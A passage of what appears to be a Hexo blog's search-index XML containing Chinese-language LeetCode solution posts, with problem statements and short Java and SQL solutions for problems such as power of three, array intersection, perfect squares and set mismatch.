<h3 id="解法五：整数限制"><a href="#解法五：整数限制" class="headerlink" title="解法五：整数限制"></a>解法五：整数限制</h3><p>我们现在可以推断出 <code>n</code> 的最大值，也就是 3 的幂，是 <strong>1162261467</strong>。因此，我们应该返回 true 的 n 的可能值是 3，9…3 的19次方。因为 3 是质数，所以 3的19次方 的除数只有 3，9，27，3的19次方，因此我们只需要将 3的19次方 除以 n。若余数为 0 意味着 n 是 3的19次方 的除数，因此是 3 的幂。</p>
<h4 id="Java-4"><a href="#Java-4" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; <span class="number">1162261467</span> % n == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>350. 两个数组的交集 II</title>
    <url>/2018/08/30/LeetCode/leetcode-000350.%20%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">输出: [2,2]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">输出: [4,9]</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>输出结果中每个元素出现的次数，应与元素在两个数组中出现的次数一致。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><ul>
<li>如果给定的数组已经排好序呢？你将如何优化你的算法？</li>
<li>如果 nums1 的大小比 nums2 小很多，哪种方法更优？</li>
<li>如果 nums2 的元素存储在磁盘上，磁盘内存是有限的，并且你不能一次加载所有的元素到内存中，你该怎么办？</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>和349不同，这边不需要使用HashSet，替换成ArrayList即可。</p>
<p>使用ArrayList把两个数组相同的元素全部保存起来，返回即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersect(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		Arrays.sort(nums2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> length1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> length2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (length1 &lt; nums1.length &amp;&amp; length2 &lt; nums2.length) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums1[length1] == nums2[length2]) &#123;</span><br><span class="line">				result.add(nums1[length1]);</span><br><span class="line">				length1++;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[length1] &lt; nums2[length2]) &#123;</span><br><span class="line">				length1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> array[] = <span class="keyword">new</span> <span class="keyword">int</span>[result.size()];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; result.size();i++) &#123;</span><br><span class="line">			array[i] = result.get(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>367. 有效的完全平方数</title>
    <url>/2018/08/30/LeetCode/leetcode-000367.%20%E6%9C%89%E6%95%88%E7%9A%84%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个正整数 num，编写一个函数，如果 num 是一个完全平方数，则返回 True，否则返回 False。</p>
<p>说明：不要使用任何内置的库函数，如  <code>sqrt</code>。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 16</span><br><span class="line"></span><br><span class="line">输出： True</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 14</span><br><span class="line"></span><br><span class="line">输出： False</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>牛顿迭代法</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> r = num;</span><br><span class="line">        <span class="keyword">while</span> (r * r &gt; num) &#123;</span><br><span class="line">            r = (r + num / r) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num ==  r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>453. 最小移动次数使数组元素相等</title>
    <url>/2018/08/30/LeetCode/leetcode-000453.%20%E6%9C%80%E5%B0%8F%E7%A7%BB%E5%8A%A8%E6%AC%A1%E6%95%B0%E4%BD%BF%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0%E7%9B%B8%E7%AD%89/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个长度为 n 的<code>非</code>空整数数组，找到让数组所有元素相等的最小移动次数。每次移动可以使 n - 1 个元素增加 1。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[1,2,3]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">只需要3次移动（注意每次移动会增加两个元素的值）：</span><br><span class="line"></span><br><span class="line">[1,2,3]  &#x3D;&gt;  [2,3,3]  &#x3D;&gt;  [3,4,3]  &#x3D;&gt;  [4,4,4]</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>这个问题就是数组中最小的值，几次之后才能变成和最大的一样。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	sum += nums[i];</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; nums[i]) &#123;</span><br><span class="line">        		min = nums[i];</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - nums.length * min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>374. 猜数字大小</title>
    <url>/2018/08/30/LeetCode/leetcode-000374.%20%E7%8C%9C%E6%95%B0%E5%AD%97%E5%A4%A7%E5%B0%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们正在玩一个猜数字游戏。 游戏规则如下：<br>我从 <code>1</code> 到 <code>n</code> 选择一个数字。 你需要猜我选择了哪个数字。<br>每次你猜错了，我会告诉你这个数字是大了还是小了。<br>你调用一个预先定义好的接口 <code>guess(int num)</code>，它会返回 3 个可能的结果（<code>-1</code>，<code>1</code> 或 <code>0</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1 : 我的数字比较小</span><br><span class="line"> 1 : 我的数字比较大</span><br><span class="line"> 0 : 恭喜！你猜对了！</span><br></pre></td></tr></table></figure>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 10, 我选择 6.</span><br><span class="line"></span><br><span class="line">返回 6.</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>二分查找</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The guess API is defined in the parent class GuessGame.</span></span><br><span class="line"><span class="comment">   @param num, your guess</span></span><br><span class="line"><span class="comment">   @return -1 if my number is lower, 1 if my number is higher, otherwise return 0</span></span><br><span class="line"><span class="comment">      int guess(int num); */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">GuessGame</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">guessNumber</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> end = n;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">        	mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (<span class="number">1</span> == guess(mid)) &#123;</span><br><span class="line">        		begin = mid + <span class="number">1</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (-<span class="number">1</span> == guess(mid)) &#123;</span><br><span class="line">        		end = mid - <span class="number">1</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="keyword">return</span> mid;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>581. 最短无序连续子数组</title>
    <url>/2018/08/30/LeetCode/leetcode-000581.%20%E6%9C%80%E7%9F%AD%E6%97%A0%E5%BA%8F%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，你需要寻找一个<code>连续的子数组</code>，如果对这个子数组进行升序排序，那么整个数组都会变为升序排序。</p>
<p>你找到的子数组应是<code>最短</code>的，请输出它的长度。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2, 6, 4, 8, 10, 9, 15]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 你只需要对 [6, 4, 8, 10, 9] 进行升序排序，那么整个表都会变为升序排序。</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ol>
<li>输入的数组长度范围在 [1, 10,000]。</li>
<li>输入的数组可能包含重复元素 ，所以升序的意思是&lt;=。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将原数组拷贝一份，排序。然后从头和从尾部分别遍历，找到不同的子序列即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findUnsortedSubarray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] numOfCopy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> begin = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] != numOfCopy[i]) &#123;</span><br><span class="line">        		begin = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> end = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = nums.length - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] != numOfCopy[i]) &#123;</span><br><span class="line">        		end = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (begin == -<span class="number">1</span> || end == -<span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> end - begin + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>596. 超过5名学生的课</title>
    <url>/2018/08/30/LeetCode/leetcode-000596.%20%E8%B6%85%E8%BF%875%E5%90%8D%E5%AD%A6%E7%94%9F%E7%9A%84%E8%AF%BE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有一个<code>courses</code> 表 ，有: <code>student</code> (学生) 和 <code>class</code> (课程)。</p>
<p>请列出所有超过或等于5名学生的课。</p>
<p>例如,表:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------+</span><br><span class="line">| student | class      |</span><br><span class="line">+---------+------------+</span><br><span class="line">| A       | Math       |</span><br><span class="line">| B       | English    |</span><br><span class="line">| C       | Math       |</span><br><span class="line">| D       | Biology    |</span><br><span class="line">| E       | Math       |</span><br><span class="line">| F       | Computer   |</span><br><span class="line">| G       | Math       |</span><br><span class="line">| H       | Math       |</span><br><span class="line">| I       | Math       |</span><br><span class="line">+---------+------------+</span><br></pre></td></tr></table></figure>
<p>应该输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| class   |</span><br><span class="line">+---------+</span><br><span class="line">| Math    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><p>学生在每个课中不应被重复计算。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">class</span> <span class="keyword">from</span> courses <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">class</span> <span class="keyword">having</span> <span class="keyword">count</span>(<span class="keyword">distinct</span>(student)) &gt;= <span class="number">5</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>633. 平方数之和</title>
    <url>/2018/08/30/LeetCode/leetcode-000633.%20%E5%B9%B3%E6%96%B9%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 <code>c</code> ，你要判断是否存在两个整数 <code>a</code> 和 <code>b</code>，使得 a^2 + b^2 = c。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: True</span><br><span class="line">解释: 1 * 1 + 2 * 2 &#x3D; 5</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>不好说</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (<span class="keyword">int</span>) Math.sqrt(c);</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = mid;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right ) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (c == left * left + right * right) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt; left * left + right * right) &#123;</span><br><span class="line">        		left++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		right--;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>645. 错误的集合</title>
    <url>/2018/08/30/LeetCode/leetcode-000645.%20%E9%94%99%E8%AF%AF%E7%9A%84%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>集合 <code>S</code> 包含从1到 <code>n</code> 的整数。不幸的是，因为数据错误，导致集合里面某一个元素复制了成了集合里面的另外一个元素的值，导致集合丢失了一个整数并且有一个元素重复。</p>
<p>给定一个数组 <code>nums</code> 代表了集合 <code>S</code> 发生错误后的结果。你的任务是首先寻找到重复出现的整数，再找到丢失的整数，将它们以数组的形式返回。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [1,2,2,4]</span><br><span class="line">输出: [2,3]</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol>
<li>给定数组的长度范围是 [2, 10000]。</li>
<li>给定的数组是无序的。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>使用一个中间数组来保存出现过的数字。即，将中间数组对应索引为该数字的值置为1，如果一个数字，去值位的时候发现该位置上已经是1了， 则说明该数字是多出来的数字。最后扫描一遍中间数组，未置0的则为缺失的数字。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findErrorNums(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> more = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> less = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (result[nums[i]] == <span class="number">1</span>) &#123;</span><br><span class="line">        		more = nums[i];</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				result[nums[i]] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; result.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span>(result[i] == <span class="number">0</span>) &#123;</span><br><span class="line">        		less = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;more, less&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>686. 重复叠加字符串匹配</title>
    <url>/2018/08/30/LeetCode/leetcode-000686.%20%E9%87%8D%E5%A4%8D%E5%8F%A0%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 A 和 B, 寻找重复叠加字符串A的最小次数，使得字符串B成为叠加后的字符串A的子串，如果不存在则返回 -1。</p>
<p>举个例子，A = “abcd”，B = “cdabcdab”。</p>
<p>答案为 3， 因为 A 重复叠加三遍后为 “abcdabcdabcd”，此时 B 是其子串；A 重复叠加两遍后为”abcdabcd”，B 并不是其子串。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>A 与 B 字符串的长度在1和10000区间范围内。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>拼接，判断即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedStringMatch</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer(A);</span><br><span class="line">        <span class="keyword">while</span> (sb.length() &lt;= <span class="number">10000</span>) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (sb.toString().contains(B)) &#123;</span><br><span class="line">        		<span class="keyword">return</span> result;</span><br><span class="line">        	&#125;</span><br><span class="line">        	sb.append(A);</span><br><span class="line">        	result++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!sb.toString().contains(B)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>717. 1比特与2比特字符</title>
    <url>/2018/08/30/LeetCode/leetcode-000717.%201%E6%AF%94%E7%89%B9%E4%B8%8E2%E6%AF%94%E7%89%B9%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有两种特殊字符。第一种字符可以用一比特<code>0</code>来表示。第二种字符可以用两比特(<code>10</code> 或 <code>1</code>1)来表示。</p>
<p>现给一个由若干比特组成的字符串。问最后一个字符是否必定为一个一比特字符。给定的字符串总是由<code>0</code>结束。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">bits &#x3D; [1, 0, 0]</span><br><span class="line">输出: True</span><br><span class="line">解释: </span><br><span class="line">唯一的编码方式是一个两比特字符和一个一比特字符。所以最后一个字符是一比特字符。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">bits &#x3D; [1, 1, 1, 0]</span><br><span class="line">输出: False</span><br><span class="line">解释: </span><br><span class="line">唯一的编码方式是两比特字符和两比特字符。所以最后一个字符不是一比特字符。</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li><code>1 &lt;= len(bits) &lt;= 1000.</code></li>
<li><code>bits[i]</code> 总是<code>0</code> 或 <code>1</code>.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果出现1了，那么其后面的数字肯定是跟着1的，那么只要略过这个数字即可。<br>具体思路可参考：<a href="https://blog.csdn.net/qq_16151925/article/details/80204862" target="_blank" rel="noopener">https://blog.csdn.net/qq_16151925/article/details/80204862</a></p>
